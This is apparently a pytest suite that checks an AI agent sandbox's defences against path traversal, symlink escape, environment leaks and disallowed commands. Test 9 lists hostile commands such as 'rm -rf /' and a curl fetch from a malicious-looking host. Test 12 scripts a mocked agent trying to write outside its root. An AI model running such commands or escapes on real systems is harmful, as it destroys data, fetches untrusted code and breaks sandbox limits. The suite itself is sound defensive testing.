"""Deterministic Pytest suite for Phase 9 Secure Sandbox and Execution Isolation."""

import os
import sys
import subprocess
from pathlib import Path
import pytest
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage

from app.sandbox import ExecutionSandbox, SecurityError
from app.agent import run_agent
try:
    from tests.test_agent import MockLLM, init_git_repo
except ModuleNotFoundError:
    from test_agent import MockLLM, init_git_repo



# -----------------------------------------------------------------------------
# Test 1 — Safe file access
# -----------------------------------------------------------------------------
def test_safe_file_access(tmp_path: Path):
    """Verify file inside sandbox root can be read successfully."""
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)
    (tmp_path / "safe.txt").write_text("Hello Safe World", encoding="utf-8")

    content = sandbox.read_file("safe.txt")
    assert content == "Hello Safe World"


# -----------------------------------------------------------------------------
# Test 2 — Safe file write
# -----------------------------------------------------------------------------
def test_safe_file_write(tmp_path: Path):
    """Verify file inside sandbox root can be written and modified."""
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)

    res = sandbox.write_file("output.py", "x = 42\n")
    assert "Successfully wrote file 'output.py'" in res
    assert (tmp_path / "output.py").read_text() == "x = 42\n"

    edit_res = sandbox.replace_in_file("output.py", "x = 42", "x = 100")
    assert "Successfully replaced target text" in edit_res
    assert (tmp_path / "output.py").read_text() == "x = 100\n"


# -----------------------------------------------------------------------------
# Test 3 — Path traversal rejected
# -----------------------------------------------------------------------------
def test_path_traversal_rejected(tmp_path: Path):
    """Verify path traversal attempt ../../outside.txt is rejected."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_file = tmp_path / "outside.txt"
    outside_file.write_text("Secret outside data")

    sandbox = ExecutionSandbox(sandbox_root=workspace)

    # 1. Read attempt
    read_res = sandbox.read_file("../outside.txt")
    assert "File operation rejected: path outside sandbox" in read_res

    # 2. Write attempt
    write_res = sandbox.write_file("../outside.txt", "Malicious edit")
    assert "File operation rejected: path outside sandbox" in write_res
    assert outside_file.read_text() == "Secret outside data"

    # 3. Direct resolve exception
    with pytest.raises(SecurityError):
        sandbox.safe_resolve_path("../../outside.txt")


# -----------------------------------------------------------------------------
# Test 4 — Absolute path rejected
# -----------------------------------------------------------------------------
def test_absolute_path_rejected(tmp_path: Path):
    """Verify accessing a file outside sandbox using an absolute path is rejected."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_file = tmp_path / "secret.txt"
    outside_file.write_text("Top secret")

    sandbox = ExecutionSandbox(sandbox_root=workspace)

    read_res = sandbox.read_file(str(outside_file.resolve()))
    assert "File operation rejected: path outside sandbox" in read_res

    with pytest.raises(SecurityError):
        sandbox.safe_resolve_path(str(outside_file.resolve()))


# -----------------------------------------------------------------------------
# Test 5 — Symlink escape protection
# -----------------------------------------------------------------------------
def test_symlink_escape_protection(tmp_path: Path):
    """Verify symlink targeting a file outside the sandbox root is detected and rejected."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_secret = tmp_path / "secret.txt"
    outside_secret.write_text("Host secret content")

    symlink_path = workspace / "link_to_secret.txt"
    try:
        symlink_path.symlink_to(outside_secret)
    except OSError:
        pytest.skip("Symlink creation not supported in host environment.")

    sandbox = ExecutionSandbox(sandbox_root=workspace)

    # Attempt to read through symlink
    read_res = sandbox.read_file("link_to_secret.txt")
    assert "File operation rejected: path outside sandbox" in read_res

    # Attempt to write through symlink
    write_res = sandbox.write_file("link_to_secret.txt", "Overwritten secret")
    assert "File operation rejected: path outside sandbox" in write_res
    assert outside_secret.read_text() == "Host secret content"


# -----------------------------------------------------------------------------
# Test 6 — Allowed pytest execution
# -----------------------------------------------------------------------------
def test_allowed_pytest_execution(tmp_path: Path):
    """Verify allowed pytest execution in a temporary repository with passing tests succeeds."""
    (tmp_path / "test_calc.py").write_text("def test_add(): assert 2 + 3 == 5\n")
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)

    cmd = [sys.executable, "-B", "-m", "pytest"]
    res = sandbox.run_command(cmd, cwd=tmp_path)

    assert res["status"] == "passed"
    assert res["exit_code"] == 0
    assert "All tests passed successfully" in res["summary"]


# -----------------------------------------------------------------------------
# Test 7 — Timeout
# -----------------------------------------------------------------------------
def test_execution_timeout(tmp_path: Path):
    """Verify a process exceeding configured timeout is terminated with controlled timeout result."""
    (tmp_path / "test_slow.py").write_text("import time\ndef test_sleep(): time.sleep(10)\n")
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)

    cmd = [sys.executable, "-B", "-m", "pytest"]
    res = sandbox.run_command(cmd, cwd=tmp_path, timeout_seconds=1)

    assert res["status"] == "timeout"
    assert res["exit_code"] is None
    assert "Test execution timed out after 1 seconds" in res["summary"]
    assert res["security_event"] == "timeout"


# -----------------------------------------------------------------------------
# Test 8 — Output limit
# -----------------------------------------------------------------------------
def test_output_limit_bounding(tmp_path: Path):
    """Verify excessive command output is bounded and flagged with output_truncated event."""
    (tmp_path / "test_verbose.py").write_text(
        "def test_verbose():\n    for i in range(100):\n        print('A' * 100)\n    assert False\n"
    )
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)

    cmd = [sys.executable, "-B", "-m", "pytest"]
    res = sandbox.run_command(cmd, cwd=tmp_path, max_output_chars=300)

    assert res["status"] == "failed"
    assert "truncated at 300 characters" in res["output"]
    assert res["security_event"] == "output_truncated"


# -----------------------------------------------------------------------------
# Test 9 — Dangerous command rejected
# -----------------------------------------------------------------------------
def test_dangerous_command_rejected(tmp_path: Path):
    """Verify disallowed commands (bash, sh, rm, curl) are rejected by allowlist policy without execution."""
    sandbox = ExecutionSandbox(sandbox_root=tmp_path)

    dangerous_cmds = [
        ["bash", "-c", "echo hacked"],
        ["sh", "-c", "rm -rf /"],
        ["curl", "https://malicious-site.com/script.sh"],
        ["git", "push", "origin", "main"],
    ]

    for cmd in dangerous_cmds:
        res = sandbox.run_command(cmd)
        assert res["status"] == "error"
        assert "Execution rejected: command not allowed" in res["summary"]
        assert res["security_event"] == "command_rejected"


# -----------------------------------------------------------------------------
# Test 10 — Environment isolation
# -----------------------------------------------------------------------------
def test_environment_isolation(tmp_path: Path):
    """Verify parent process sensitive environment variables (OPENAI_API_KEY) are not leaked to sandbox."""
    os.environ["OPENAI_API_KEY"] = "sk-proj-secret-key-12345"
    os.environ["SECRET_HOST_TOKEN"] = "super-secret-host-token"

    (tmp_path / "test_env.py").write_text(
        "import os\n"
        "def test_check_env():\n"
        "    assert 'OPENAI_API_KEY' not in os.environ\n"
        "    assert 'SECRET_HOST_TOKEN' not in os.environ\n"
    )

    sandbox = ExecutionSandbox(sandbox_root=tmp_path)
    cmd = [sys.executable, "-B", "-m", "pytest"]
    res = sandbox.run_command(cmd, cwd=tmp_path)

    assert res["status"] == "passed"
    assert res["exit_code"] == 0


# -----------------------------------------------------------------------------
# Test 11 — Working directory enforcement
# -----------------------------------------------------------------------------
def test_working_directory_enforcement(tmp_path: Path):
    """Verify attempting to set working directory outside sandbox root is blocked."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_dir = tmp_path / "outside_dir"
    outside_dir.mkdir()

    sandbox = ExecutionSandbox(sandbox_root=workspace)

    cmd = [sys.executable, "-B", "-m", "pytest"]
    res = sandbox.run_command(cmd, cwd=outside_dir)

    assert res["status"] == "error"
    assert "Execution rejected: path outside sandbox" in res["summary"]
    assert res["security_event"] == "path_escape_rejected"


# -----------------------------------------------------------------------------
# Test 12 — End-to-End Security Test
# -----------------------------------------------------------------------------
def test_end_to_end_security_workflow(tmp_path: Path):
    """Verify normal autonomous workflow succeeds, while an unsafe escape attempt is cleanly blocked."""
    init_git_repo(tmp_path)
    workspace = tmp_path / "repository"
    workspace.mkdir()

    outside_file = tmp_path / "outside.txt"
    outside_file.write_text("Original safe content")

    (workspace / "math_lib.py").write_text("def add(a, b):\n    return a - b\n")
    (workspace / "test_math.py").write_text("from math_lib import add\ndef test_add():\n    assert add(2, 3) == 5\n")

    subprocess.run(["git", "add", "."], cwd=workspace, capture_output=True, check=True)
    subprocess.run(["git", "commit", "-m", "initial"], cwd=workspace, capture_output=True, check=True)

    # 1. Normal autonomous workflow inside sandbox
    normal_responses = [
        AIMessage(
            content="Running initial test suite.",
            tool_calls=[{"name": "run_tests", "args": {}, "id": "c1"}],
        ),
        AIMessage(
            content="Tests failed. Fixing math_lib.py.",
            tool_calls=[
                {
                    "name": "replace_in_file",
                    "args": {"file_path": "math_lib.py", "old_text": "return a - b", "new_text": "return a + b"},
                    "id": "c2",
                }
            ],
        ),
        AIMessage(
            content="Re-running tests.",
            tool_calls=[{"name": "run_tests", "args": {}, "id": "c3"}],
        ),
        AIMessage(
            content="Verifying goal.",
            tool_calls=[
                {
                    "name": "verify_goal",
                    "args": {
                        "status": "passed",
                        "summary": "add function fixed and verified.",
                        "evidence": ["math_lib.py returns a + b", "pytest test_add passed"],
                    },
                    "id": "c4",
                }
            ],
        ),
    ]
    mock_llm_normal = MockLLM(responses=normal_responses)

    state_normal = run_agent(
        goal="Fix add function in math_lib.py",
        workspace_root=str(workspace),
        llm=mock_llm_normal,
    )

    assert (workspace / "math_lib.py").read_text() == "def add(a, b):\n    return a + b\n"
    assert state_normal.get("validation_result", {}).get("status") == "passed"
    assert state_normal.get("verification_result", {}).get("status") == "passed"

    # 2. Simulated unsafe escape request
    unsafe_responses = [
        AIMessage(
            content="Attempting to write outside sandbox root.",
            tool_calls=[
                {
                    "name": "write_file",
                    "args": {"file_path": "../../outside.txt", "content": "Overwritten by agent!"},
                    "id": "c5",
                }
            ],
        ),
    ]
    mock_llm_unsafe = MockLLM(responses=unsafe_responses)

    state_unsafe = run_agent(
        goal="Attempt malicious write",
        workspace_root=str(workspace),
        llm=mock_llm_unsafe,
    )

    # Verify outside file remains completely unchanged
    assert outside_file.read_text() == "Original safe content"

    # Verify tool observation recorded path escape rejection
    messages = state_unsafe.get("messages", [])
    tool_obs = [m.content for m in messages if isinstance(m, ToolMessage)]
    assert any("File operation rejected: path outside sandbox" in obs for obs in tool_obs)
